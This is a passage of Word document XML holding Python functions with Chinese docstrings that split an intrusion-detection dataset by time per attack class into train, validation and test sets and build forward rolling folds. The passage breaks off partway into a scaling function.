        <w:widowControl w:val="0"/>
        <w:spacing w:before="0" w:after="0" w:line="240" w:lineRule="auto"/>
        <w:ind w:left="0"/>
      </w:pPr>
    </w:p>
    <w:p w14:paraId="4E68DC66">
      <w:pPr>
        <w:widowControl w:val="0"/>
        <w:spacing w:before="0" w:after="0" w:line="240" w:lineRule="auto"/>
        <w:ind w:left="0"/>
      </w:pPr>
    </w:p>
    <w:p w14:paraId="22DC1185">
      <w:pPr>
        <w:widowControl w:val="0"/>
        <w:spacing w:before="0" w:after="0" w:line="240" w:lineRule="auto"/>
        <w:ind w:left="0"/>
      </w:pPr>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Consolas" w:hAnsi="Consolas" w:eastAsia="宋体"/>
          <w:b w:val="0"/>
          <w:color w:val="000000"/>
          <w:sz w:val="16"/>
        </w:rPr>
        <w:t>def split_by_time(X, y, order, test_size, val_size):</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="07CB7823">
      <w:pPr>
        <w:widowControl w:val="0"/>
        <w:spacing w:before="0" w:after="0" w:line="240" w:lineRule="auto"/>
        <w:ind w:left="0"/>
      </w:pPr>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Consolas" w:hAnsi="Consolas" w:eastAsia="宋体"/>
          <w:b w:val="0"/>
          <w:color w:val="000000"/>
          <w:sz w:val="16"/>
        </w:rPr>
        <w:t xml:space="preserve">    """按类内部的时间顺序留出：最早 70% 训练、接着 20% 验证、最后 10% 测试。</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="686ACAD3">
      <w:pPr>
        <w:widowControl w:val="0"/>
        <w:spacing w:before="0" w:after="0" w:line="240" w:lineRule="auto"/>
        <w:ind w:left="0"/>
      </w:pPr>
    </w:p>
    <w:p w14:paraId="3109A9F6">
      <w:pPr>
        <w:widowControl w:val="0"/>
        <w:spacing w:before="0" w:after="0" w:line="240" w:lineRule="auto"/>
        <w:ind w:left="0"/>
      </w:pPr>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Consolas" w:hAnsi="Consolas" w:eastAsia="宋体"/>
          <w:b w:val="0"/>
          <w:color w:val="000000"/>
          <w:sz w:val="16"/>
        </w:rPr>
        <w:t xml:space="preserve">    为什么不能整段按时间切：每个攻击类只占一段连续时间窗（DoS Hulk 集中在 Wednesday 文件</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="4EF2FB3A">
      <w:pPr>
        <w:widowControl w:val="0"/>
        <w:spacing w:before="0" w:after="0" w:line="240" w:lineRule="auto"/>
        <w:ind w:left="0"/>
      </w:pPr>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Consolas" w:hAnsi="Consolas" w:eastAsia="宋体"/>
          <w:b w:val="0"/>
          <w:color w:val="000000"/>
          <w:sz w:val="16"/>
        </w:rPr>
        <w:t xml:space="preserve">    前半段，Heartbleed 全在 86% 处）。整段切会把 DoS Hulk 全放进训练侧、Heartbleed 全放进</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="26AEE3F0">
      <w:pPr>
        <w:widowControl w:val="0"/>
        <w:spacing w:before="0" w:after="0" w:line="240" w:lineRule="auto"/>
        <w:ind w:left="0"/>
      </w:pPr>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Consolas" w:hAnsi="Consolas" w:eastAsia="宋体"/>
          <w:b w:val="0"/>
          <w:color w:val="000000"/>
          <w:sz w:val="16"/>
        </w:rPr>
        <w:t xml:space="preserve">    测试侧。按类切保证六类都在三侧，测试侧取的是每类最晚的实例。</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="62A793ED">
      <w:pPr>
        <w:widowControl w:val="0"/>
        <w:spacing w:before="0" w:after="0" w:line="240" w:lineRule="auto"/>
        <w:ind w:left="0"/>
      </w:pPr>
    </w:p>
    <w:p w14:paraId="1137602C">
      <w:pPr>
        <w:widowControl w:val="0"/>
        <w:spacing w:before="0" w:after="0" w:line="240" w:lineRule="auto"/>
        <w:ind w:left="0"/>
      </w:pPr>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Consolas" w:hAnsi="Consolas" w:eastAsia="宋体"/>
          <w:b w:val="0"/>
          <w:color w:val="000000"/>
          <w:sz w:val="16"/>
        </w:rPr>
        <w:t xml:space="preserve">    也不做跨天留出：每个攻击类只出现在一天的文件里，留出整天等于测试侧出现训练时从未见过的类。</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="698B5ABD">
      <w:pPr>
        <w:widowControl w:val="0"/>
        <w:spacing w:before="0" w:after="0" w:line="240" w:lineRule="auto"/>
        <w:ind w:left="0"/>
      </w:pPr>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Consolas" w:hAnsi="Consolas" w:eastAsia="宋体"/>
          <w:b w:val="0"/>
          <w:color w:val="000000"/>
          <w:sz w:val="16"/>
        </w:rPr>
        <w:t xml:space="preserve">    """</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="757F5FBE">
      <w:pPr>
        <w:widowControl w:val="0"/>
        <w:spacing w:before="0" w:after="0" w:line="240" w:lineRule="auto"/>
        <w:ind w:left="0"/>
      </w:pPr>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Consolas" w:hAnsi="Consolas" w:eastAsia="宋体"/>
          <w:b w:val="0"/>
          <w:color w:val="000000"/>
          <w:sz w:val="16"/>
        </w:rPr>
        <w:t xml:space="preserve">    cuts = {name: [] for name in ("train", "val", "test")}</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="2FAC40E7">
      <w:pPr>
        <w:widowControl w:val="0"/>
        <w:spacing w:before="0" w:after="0" w:line="240" w:lineRule="auto"/>
        <w:ind w:left="0"/>
      </w:pPr>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Consolas" w:hAnsi="Consolas" w:eastAsia="宋体"/>
          <w:b w:val="0"/>
          <w:color w:val="000000"/>
          <w:sz w:val="16"/>
        </w:rPr>
        <w:t xml:space="preserve">    for cls in np.unique(y):</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="6D063B02">
      <w:pPr>
        <w:widowControl w:val="0"/>
        <w:spacing w:before="0" w:after="0" w:line="240" w:lineRule="auto"/>
        <w:ind w:left="0"/>
      </w:pPr>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Consolas" w:hAnsi="Consolas" w:eastAsia="宋体"/>
          <w:b w:val="0"/>
          <w:color w:val="000000"/>
          <w:sz w:val="16"/>
        </w:rPr>
        <w:t xml:space="preserve">        idx = np.flatnonzero(y == cls)</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="44BAE88E">
      <w:pPr>
        <w:widowControl w:val="0"/>
        <w:spacing w:before="0" w:after="0" w:line="240" w:lineRule="auto"/>
        <w:ind w:left="0"/>
      </w:pPr>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Consolas" w:hAnsi="Consolas" w:eastAsia="宋体"/>
          <w:b w:val="0"/>
          <w:color w:val="000000"/>
          <w:sz w:val="16"/>
        </w:rPr>
        <w:t xml:space="preserve">        idx = idx[np.argsort(order[idx], kind="stable")]</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="4F1F6AC0">
      <w:pPr>
        <w:widowControl w:val="0"/>
        <w:spacing w:before="0" w:after="0" w:line="240" w:lineRule="auto"/>
        <w:ind w:left="0"/>
      </w:pPr>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Consolas" w:hAnsi="Consolas" w:eastAsia="宋体"/>
          <w:b w:val="0"/>
          <w:color w:val="000000"/>
          <w:sz w:val="16"/>
        </w:rPr>
        <w:t xml:space="preserve">        n = len(idx)</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="3693F7F2">
      <w:pPr>
        <w:widowControl w:val="0"/>
        <w:spacing w:before="0" w:after="0" w:line="240" w:lineRule="auto"/>
        <w:ind w:left="0"/>
      </w:pPr>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Consolas" w:hAnsi="Consolas" w:eastAsia="宋体"/>
          <w:b w:val="0"/>
          <w:color w:val="000000"/>
          <w:sz w:val="16"/>
        </w:rPr>
        <w:t xml:space="preserve">        n_test = int(round(n * test_size))</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="744C8A31">
      <w:pPr>
        <w:widowControl w:val="0"/>
        <w:spacing w:before="0" w:after="0" w:line="240" w:lineRule="auto"/>
        <w:ind w:left="0"/>
      </w:pPr>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Consolas" w:hAnsi="Consolas" w:eastAsia="宋体"/>
          <w:b w:val="0"/>
          <w:color w:val="000000"/>
          <w:sz w:val="16"/>
        </w:rPr>
        <w:t xml:space="preserve">        n_val = int(round(n * val_size))</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="1C4C618C">
      <w:pPr>
        <w:widowControl w:val="0"/>
        <w:spacing w:before="0" w:after="0" w:line="240" w:lineRule="auto"/>
        <w:ind w:left="0"/>
      </w:pPr>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Consolas" w:hAnsi="Consolas" w:eastAsia="宋体"/>
          <w:b w:val="0"/>
          <w:color w:val="000000"/>
          <w:sz w:val="16"/>
        </w:rPr>
        <w:t xml:space="preserve">        n_train = n - n_test - n_val</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="15D6A60E">
      <w:pPr>
        <w:widowControl w:val="0"/>
        <w:spacing w:before="0" w:after="0" w:line="240" w:lineRule="auto"/>
        <w:ind w:left="0"/>
      </w:pPr>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Consolas" w:hAnsi="Consolas" w:eastAsia="宋体"/>
          <w:b w:val="0"/>
          <w:color w:val="000000"/>
          <w:sz w:val="16"/>
        </w:rPr>
        <w:t xml:space="preserve">        if n_train &lt;= 0:</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="6B2BFAE1">
      <w:pPr>
        <w:widowControl w:val="0"/>
        <w:spacing w:before="0" w:after="0" w:line="240" w:lineRule="auto"/>
        <w:ind w:left="0"/>
      </w:pPr>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Consolas" w:hAnsi="Consolas" w:eastAsia="宋体"/>
          <w:b w:val="0"/>
          <w:color w:val="000000"/>
          <w:sz w:val="16"/>
        </w:rPr>
        <w:t xml:space="preserve">            raise SystemExit(</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="2C88EB87">
      <w:pPr>
        <w:widowControl w:val="0"/>
        <w:spacing w:before="0" w:after="0" w:line="240" w:lineRule="auto"/>
        <w:ind w:left="0"/>
      </w:pPr>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Consolas" w:hAnsi="Consolas" w:eastAsia="宋体"/>
          <w:b w:val="0"/>
          <w:color w:val="000000"/>
          <w:sz w:val="16"/>
        </w:rPr>
        <w:t xml:space="preserve">                f"类 {cls} 只有 {n} 行，按 {test_size}/{val_size} 切不出训练集；"</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="02391B5B">
      <w:pPr>
        <w:widowControl w:val="0"/>
        <w:spacing w:before="0" w:after="0" w:line="240" w:lineRule="auto"/>
        <w:ind w:left="0"/>
      </w:pPr>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Consolas" w:hAnsi="Consolas" w:eastAsia="宋体"/>
          <w:b w:val="0"/>
          <w:color w:val="000000"/>
          <w:sz w:val="16"/>
        </w:rPr>
        <w:t xml:space="preserve">                f"请提高该类配额或调小划比例"</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="1AE5927D">
      <w:pPr>
        <w:widowControl w:val="0"/>
        <w:spacing w:before="0" w:after="0" w:line="240" w:lineRule="auto"/>
        <w:ind w:left="0"/>
      </w:pPr>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Consolas" w:hAnsi="Consolas" w:eastAsia="宋体"/>
          <w:b w:val="0"/>
          <w:color w:val="000000"/>
          <w:sz w:val="16"/>
        </w:rPr>
        <w:t xml:space="preserve">            )</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="6F86A16C">
      <w:pPr>
        <w:widowControl w:val="0"/>
        <w:spacing w:before="0" w:after="0" w:line="240" w:lineRule="auto"/>
        <w:ind w:left="0"/>
      </w:pPr>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Consolas" w:hAnsi="Consolas" w:eastAsia="宋体"/>
          <w:b w:val="0"/>
          <w:color w:val="000000"/>
          <w:sz w:val="16"/>
        </w:rPr>
        <w:t xml:space="preserve">        cuts["train"].append(idx[:n_train])</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="36C00E29">
      <w:pPr>
        <w:widowControl w:val="0"/>
        <w:spacing w:before="0" w:after="0" w:line="240" w:lineRule="auto"/>
        <w:ind w:left="0"/>
      </w:pPr>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Consolas" w:hAnsi="Consolas" w:eastAsia="宋体"/>
          <w:b w:val="0"/>
          <w:color w:val="000000"/>
          <w:sz w:val="16"/>
        </w:rPr>
        <w:t xml:space="preserve">        cuts["val"].append(idx[n_train:n_train + n_val])</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="16B08C67">
      <w:pPr>
        <w:widowControl w:val="0"/>
        <w:spacing w:before="0" w:after="0" w:line="240" w:lineRule="auto"/>
        <w:ind w:left="0"/>
      </w:pPr>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Consolas" w:hAnsi="Consolas" w:eastAsia="宋体"/>
          <w:b w:val="0"/>
          <w:color w:val="000000"/>
          <w:sz w:val="16"/>
        </w:rPr>
        <w:t xml:space="preserve">        cuts["test"].append(idx[n_train + n_val:])</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="3AE4077D">
      <w:pPr>
        <w:widowControl w:val="0"/>
        <w:spacing w:before="0" w:after="0" w:line="240" w:lineRule="auto"/>
        <w:ind w:left="0"/>
      </w:pPr>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Consolas" w:hAnsi="Consolas" w:eastAsia="宋体"/>
          <w:b w:val="0"/>
          <w:color w:val="000000"/>
          <w:sz w:val="16"/>
        </w:rPr>
        <w:t xml:space="preserve">    return tuple(np.sort(np.concatenate(cuts[k])) for k in ("train", "val", "test"))</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="4E692D4C">
      <w:pPr>
        <w:widowControl w:val="0"/>
        <w:spacing w:before="0" w:after="0" w:line="240" w:lineRule="auto"/>
        <w:ind w:left="0"/>
      </w:pPr>
    </w:p>
    <w:p w14:paraId="427B2A89">
      <w:pPr>
        <w:widowControl w:val="0"/>
        <w:spacing w:before="0" w:after="0" w:line="240" w:lineRule="auto"/>
        <w:ind w:left="0"/>
      </w:pPr>
    </w:p>
    <w:p w14:paraId="22837656">
      <w:pPr>
        <w:widowControl w:val="0"/>
        <w:spacing w:before="0" w:after="0" w:line="240" w:lineRule="auto"/>
        <w:ind w:left="0"/>
      </w:pPr>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Consolas" w:hAnsi="Consolas" w:eastAsia="宋体"/>
          <w:b w:val="0"/>
          <w:color w:val="000000"/>
          <w:sz w:val="16"/>
        </w:rPr>
        <w:t>def forward_folds(y, order, test_size, n_blocks=5, min_train_blocks=2):</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="3C9602F1">
      <w:pPr>
        <w:widowControl w:val="0"/>
        <w:spacing w:before="0" w:after="0" w:line="240" w:lineRule="auto"/>
        <w:ind w:left="0"/>
      </w:pPr>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Consolas" w:hAnsi="Consolas" w:eastAsia="宋体"/>
          <w:b w:val="0"/>
          <w:color w:val="000000"/>
          <w:sz w:val="16"/>
        </w:rPr>
        <w:t xml:space="preserve">    """前向滚动验证（expanding window）：每类按时间切块，逐块往后滚。</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="550F2F20">
      <w:pPr>
        <w:widowControl w:val="0"/>
        <w:spacing w:before="0" w:after="0" w:line="240" w:lineRule="auto"/>
        <w:ind w:left="0"/>
      </w:pPr>
    </w:p>
    <w:p w14:paraId="462A228B">
      <w:pPr>
        <w:widowControl w:val="0"/>
        <w:spacing w:before="0" w:after="0" w:line="240" w:lineRule="auto"/>
        <w:ind w:left="0"/>
      </w:pPr>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Consolas" w:hAnsi="Consolas" w:eastAsia="宋体"/>
          <w:b w:val="0"/>
          <w:color w:val="000000"/>
          <w:sz w:val="16"/>
        </w:rPr>
        <w:t xml:space="preserve">    为什么不只用一次性的 val：val 只占一段、且紧挨着训练段，模型在这段上的表现几乎</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="57B8C320">
      <w:pPr>
        <w:widowControl w:val="0"/>
        <w:spacing w:before="0" w:after="0" w:line="240" w:lineRule="auto"/>
        <w:ind w:left="0"/>
      </w:pPr>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Consolas" w:hAnsi="Consolas" w:eastAsia="宋体"/>
          <w:b w:val="0"/>
          <w:color w:val="000000"/>
          <w:sz w:val="16"/>
        </w:rPr>
        <w:t xml:space="preserve">    等于训练表现，分辨不出"会不会在更晚的数据上退化"。实测随机森林与 XGBoost 在</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="4A33D0EF">
      <w:pPr>
        <w:widowControl w:val="0"/>
        <w:spacing w:before="0" w:after="0" w:line="240" w:lineRule="auto"/>
        <w:ind w:left="0"/>
      </w:pPr>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Consolas" w:hAnsi="Consolas" w:eastAsia="宋体"/>
          <w:b w:val="0"/>
          <w:color w:val="000000"/>
          <w:sz w:val="16"/>
        </w:rPr>
        <w:t xml:space="preserve">    验证集上同为 0.9975，在最后 10% 上却差 0.024（0.9500 vs 0.9743）——用 val 选型</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="1DF60F8E">
      <w:pPr>
        <w:widowControl w:val="0"/>
        <w:spacing w:before="0" w:after="0" w:line="240" w:lineRule="auto"/>
        <w:ind w:left="0"/>
      </w:pPr>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Consolas" w:hAnsi="Consolas" w:eastAsia="宋体"/>
          <w:b w:val="0"/>
          <w:color w:val="000000"/>
          <w:sz w:val="16"/>
        </w:rPr>
        <w:t xml:space="preserve">    等于抛硬币。把开发段切成多块往后滚，验证块离训练数据越来越远，退化才显形。</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="24A34C94">
      <w:pPr>
        <w:widowControl w:val="0"/>
        <w:spacing w:before="0" w:after="0" w:line="240" w:lineRule="auto"/>
        <w:ind w:left="0"/>
      </w:pPr>
    </w:p>
    <w:p w14:paraId="45014779">
      <w:pPr>
        <w:widowControl w:val="0"/>
        <w:spacing w:before="0" w:after="0" w:line="240" w:lineRule="auto"/>
        <w:ind w:left="0"/>
      </w:pPr>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Consolas" w:hAnsi="Consolas" w:eastAsia="宋体"/>
          <w:b w:val="0"/>
          <w:color w:val="000000"/>
          <w:sz w:val="16"/>
        </w:rPr>
        <w:t xml:space="preserve">    末尾 test_size 那一段完全不参与，只在最终汇报时用一次。</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="1DB4EAC6">
      <w:pPr>
        <w:widowControl w:val="0"/>
        <w:spacing w:before="0" w:after="0" w:line="240" w:lineRule="auto"/>
        <w:ind w:left="0"/>
      </w:pPr>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Consolas" w:hAnsi="Consolas" w:eastAsia="宋体"/>
          <w:b w:val="0"/>
          <w:color w:val="000000"/>
          <w:sz w:val="16"/>
        </w:rPr>
        <w:t xml:space="preserve">    """</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="34CAE5E6">
      <w:pPr>
        <w:widowControl w:val="0"/>
        <w:spacing w:before="0" w:after="0" w:line="240" w:lineRule="auto"/>
        <w:ind w:left="0"/>
      </w:pPr>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Consolas" w:hAnsi="Consolas" w:eastAsia="宋体"/>
          <w:b w:val="0"/>
          <w:color w:val="000000"/>
          <w:sz w:val="16"/>
        </w:rPr>
        <w:t xml:space="preserve">    blocks = {}</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="0BDD77C1">
      <w:pPr>
        <w:widowControl w:val="0"/>
        <w:spacing w:before="0" w:after="0" w:line="240" w:lineRule="auto"/>
        <w:ind w:left="0"/>
      </w:pPr>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Consolas" w:hAnsi="Consolas" w:eastAsia="宋体"/>
          <w:b w:val="0"/>
          <w:color w:val="000000"/>
          <w:sz w:val="16"/>
        </w:rPr>
        <w:t xml:space="preserve">    for cls in np.unique(y):</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="33AD8223">
      <w:pPr>
        <w:widowControl w:val="0"/>
        <w:spacing w:before="0" w:after="0" w:line="240" w:lineRule="auto"/>
        <w:ind w:left="0"/>
      </w:pPr>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Consolas" w:hAnsi="Consolas" w:eastAsia="宋体"/>
          <w:b w:val="0"/>
          <w:color w:val="000000"/>
          <w:sz w:val="16"/>
        </w:rPr>
        <w:t xml:space="preserve">        idx = np.flatnonzero(y == cls)</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="4957AE67">
      <w:pPr>
        <w:widowControl w:val="0"/>
        <w:spacing w:before="0" w:after="0" w:line="240" w:lineRule="auto"/>
        <w:ind w:left="0"/>
      </w:pPr>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Consolas" w:hAnsi="Consolas" w:eastAsia="宋体"/>
          <w:b w:val="0"/>
          <w:color w:val="000000"/>
          <w:sz w:val="16"/>
        </w:rPr>
        <w:t xml:space="preserve">        idx = idx[np.argsort(order[idx], kind="stable")]</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="1D2412BD">
      <w:pPr>
        <w:widowControl w:val="0"/>
        <w:spacing w:before="0" w:after="0" w:line="240" w:lineRule="auto"/>
        <w:ind w:left="0"/>
      </w:pPr>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Consolas" w:hAnsi="Consolas" w:eastAsia="宋体"/>
          <w:b w:val="0"/>
          <w:color w:val="000000"/>
          <w:sz w:val="16"/>
        </w:rPr>
        <w:t xml:space="preserve">        n_dev = int(round(len(idx) * (1.0 - test_size)))</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="1E012655">
      <w:pPr>
        <w:widowControl w:val="0"/>
        <w:spacing w:before="0" w:after="0" w:line="240" w:lineRule="auto"/>
        <w:ind w:left="0"/>
      </w:pPr>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Consolas" w:hAnsi="Consolas" w:eastAsia="宋体"/>
          <w:b w:val="0"/>
          <w:color w:val="000000"/>
          <w:sz w:val="16"/>
        </w:rPr>
        <w:t xml:space="preserve">        blocks[cls] = np.array_split(idx[:n_dev], n_blocks)</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="17525BB8">
      <w:pPr>
        <w:widowControl w:val="0"/>
        <w:spacing w:before="0" w:after="0" w:line="240" w:lineRule="auto"/>
        <w:ind w:left="0"/>
      </w:pPr>
    </w:p>
    <w:p w14:paraId="6E073DF7">
      <w:pPr>
        <w:widowControl w:val="0"/>
        <w:spacing w:before="0" w:after="0" w:line="240" w:lineRule="auto"/>
        <w:ind w:left="0"/>
      </w:pPr>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Consolas" w:hAnsi="Consolas" w:eastAsia="宋体"/>
          <w:b w:val="0"/>
          <w:color w:val="000000"/>
          <w:sz w:val="16"/>
        </w:rPr>
        <w:t xml:space="preserve">    folds = []</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="49EDE750">
      <w:pPr>
        <w:widowControl w:val="0"/>
        <w:spacing w:before="0" w:after="0" w:line="240" w:lineRule="auto"/>
        <w:ind w:left="0"/>
      </w:pPr>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Consolas" w:hAnsi="Consolas" w:eastAsia="宋体"/>
          <w:b w:val="0"/>
          <w:color w:val="000000"/>
          <w:sz w:val="16"/>
        </w:rPr>
        <w:t xml:space="preserve">    for k in range(min_train_blocks, n_blocks):</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="2C1FFCD2">
      <w:pPr>
        <w:widowControl w:val="0"/>
        <w:spacing w:before="0" w:after="0" w:line="240" w:lineRule="auto"/>
        <w:ind w:left="0"/>
      </w:pPr>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Consolas" w:hAnsi="Consolas" w:eastAsia="宋体"/>
          <w:b w:val="0"/>
          <w:color w:val="000000"/>
          <w:sz w:val="16"/>
        </w:rPr>
        <w:t xml:space="preserve">        tr, va = [], []</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="7C969E6F">
      <w:pPr>
        <w:widowControl w:val="0"/>
        <w:spacing w:before="0" w:after="0" w:line="240" w:lineRule="auto"/>
        <w:ind w:left="0"/>
      </w:pPr>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Consolas" w:hAnsi="Consolas" w:eastAsia="宋体"/>
          <w:b w:val="0"/>
          <w:color w:val="000000"/>
          <w:sz w:val="16"/>
        </w:rPr>
        <w:t xml:space="preserve">        for parts in blocks.values():</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="28A21547">
      <w:pPr>
        <w:widowControl w:val="0"/>
        <w:spacing w:before="0" w:after="0" w:line="240" w:lineRule="auto"/>
        <w:ind w:left="0"/>
      </w:pPr>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Consolas" w:hAnsi="Consolas" w:eastAsia="宋体"/>
          <w:b w:val="0"/>
          <w:color w:val="000000"/>
          <w:sz w:val="16"/>
        </w:rPr>
        <w:t xml:space="preserve">            tr.append(np.concatenate(parts[:k]))</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="0AFA7802">
      <w:pPr>
        <w:widowControl w:val="0"/>
        <w:spacing w:before="0" w:after="0" w:line="240" w:lineRule="auto"/>
        <w:ind w:left="0"/>
      </w:pPr>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Consolas" w:hAnsi="Consolas" w:eastAsia="宋体"/>
          <w:b w:val="0"/>
          <w:color w:val="000000"/>
          <w:sz w:val="16"/>
        </w:rPr>
        <w:t xml:space="preserve">            va.append(parts[k])</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="0A4F1377">
      <w:pPr>
        <w:widowControl w:val="0"/>
        <w:spacing w:before="0" w:after="0" w:line="240" w:lineRule="auto"/>
        <w:ind w:left="0"/>
      </w:pPr>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Consolas" w:hAnsi="Consolas" w:eastAsia="宋体"/>
          <w:b w:val="0"/>
          <w:color w:val="000000"/>
          <w:sz w:val="16"/>
        </w:rPr>
        <w:t xml:space="preserve">        folds.append((np.sort(np.concatenate(tr)), np.sort(np.concatenate(va))))</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="4CDEB437">
      <w:pPr>
        <w:widowControl w:val="0"/>
        <w:spacing w:before="0" w:after="0" w:line="240" w:lineRule="auto"/>
        <w:ind w:left="0"/>
      </w:pPr>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Consolas" w:hAnsi="Consolas" w:eastAsia="宋体"/>
          <w:b w:val="0"/>
          <w:color w:val="000000"/>
          <w:sz w:val="16"/>
        </w:rPr>
        <w:t xml:space="preserve">    return folds</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="28C4C481">
      <w:pPr>
        <w:widowControl w:val="0"/>
        <w:spacing w:before="0" w:after="0" w:line="240" w:lineRule="auto"/>
        <w:ind w:left="0"/>
      </w:pPr>
    </w:p>
    <w:p w14:paraId="3B1E9BA2">
      <w:pPr>
        <w:widowControl w:val="0"/>
        <w:spacing w:before="0" w:after="0" w:line="240" w:lineRule="auto"/>
        <w:ind w:left="0"/>
      </w:pPr>
    </w:p>
    <w:p w14:paraId="0DA94A83">
      <w:pPr>
        <w:widowControl w:val="0"/>
        <w:spacing w:before="0" w:after="0" w:line="240" w:lineRule="auto"/>
        <w:ind w:left="0"/>
      </w:pPr>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Consolas" w:hAnsi="Consolas" w:eastAsia="宋体"/>
          <w:b w:val="0"/>
          <w:color w:val="000000"/>
          <w:sz w:val="16"/>
        </w:rPr>
        <w:t>def split_and_scale(X, y, test_size, val_size, seed, order=None):</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="743E5965">
      <w:pPr>
        <w:widowControl w:val="0"/>
        <w:spacing w:before="0" w:after="0" w:line="240" w:lineRule="auto"/>
        <w:ind w:left="0"/>
      </w:pPr>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Consolas" w:hAnsi="Consolas" w:eastAsia="宋体"/>
          <w:b w:val="0"/>
          <w:color w:val="000000"/>
          <w:sz w:val="16"/>
        </w:rPr>
        <w:t xml:space="preserve">    if order is None:</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="0AFF7C87">
      <w:pPr>
        <w:widowControl w:val="0"/>
        <w:spacing w:before="0" w:after="0" w:line="240" w:lineRule="auto"/>
        <w:ind w:left="0"/>
      </w:pPr>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Consolas" w:hAnsi="Consolas" w:eastAsia="宋体"/>
          <w:b w:val="0"/>
          <w:color w:val="000000"/>
          <w:sz w:val="16"/>
        </w:rPr>
        <w:t xml:space="preserve">        X_tmp, X_test, y_tmp, y_test = train_test_split(</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="5156DF1D">
